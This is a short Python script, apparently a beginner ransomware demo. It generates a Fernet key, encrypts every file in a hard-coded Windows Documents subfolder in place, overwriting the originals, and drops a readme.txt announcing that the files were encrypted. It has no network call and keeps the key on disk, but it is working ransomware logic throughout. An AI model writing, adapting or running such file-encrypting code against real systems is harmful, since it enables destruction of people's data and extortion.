from cryptography.fernet import Fernet
import os

def generarKey():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)

def retornarKey():
    return open("key.key", "rb").read()

def encryp(items, key):
    i = Fernet(key)
    for x in items:
        with open(x, "rb") as file:
            file_data = file.read()
        data = i.encrypt(file_data)
        with open(x, "wb") as file:
            file.write(data)

if __name__ == "__main__":

    archivos = "c:\\Users\\Julieta\\Documents\\encryptar"
    items = os.listdir(archivos)
    archivos_2 = [archivos + "\\" + x for x in items]

    generarKey()
    key = retornarKey()

    encryp(archivos_2, key)

    # Crear readme.txt en la carpeta principal
    with open(archivos + "\\" + "readme.txt", "w") as file:
        file.write("archivos encryptados con exitp \n")
